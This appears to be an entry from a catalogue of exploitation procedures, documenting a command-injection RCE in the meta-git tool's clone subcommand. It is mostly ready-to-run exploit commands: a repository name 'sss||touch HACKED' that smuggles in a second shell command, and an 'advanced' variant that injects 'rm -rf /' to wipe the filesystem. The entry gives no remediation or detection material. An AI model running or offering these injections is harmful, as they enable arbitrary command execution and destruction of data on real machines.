---
id: 123e4567-e89b-12d3-a456-426614174012
name: meta-git-clone-malicious
type: command
executor: bash
data: meta-git clone 'sss||touch HACKED'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:20.156Z'
platforms:
  - Linux
  - Node.js
tags:
  - rce
  - exploitation
verified: false
validated: true
submitted: true
---

# meta-git-clone-malicious

## Command

```bash
meta-git clone 'sss||touch HACKED'
```

## Description

Executes the meta-git clone with a malicious repository name that injects a shell command via '||touch HACKED', exploiting the RCE vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| clone | Clone operation subcommand | Yes |
| 'sss||touch HACKED' | Malicious repo name with injection payload | Yes |

## Examples

### Basic Usage

```bash
meta-git clone 'sss||touch HACKED'
```

### Advanced Usage

```bash
meta-git clone 'repo||rm -rf /'
```

## Expected Output

Git clone failure error, but side-effect command executes (e.g., 'HACKED' file created).

## Related

- [[Related Procedure: Exploit-RCE-in-meta-git-Clone]]
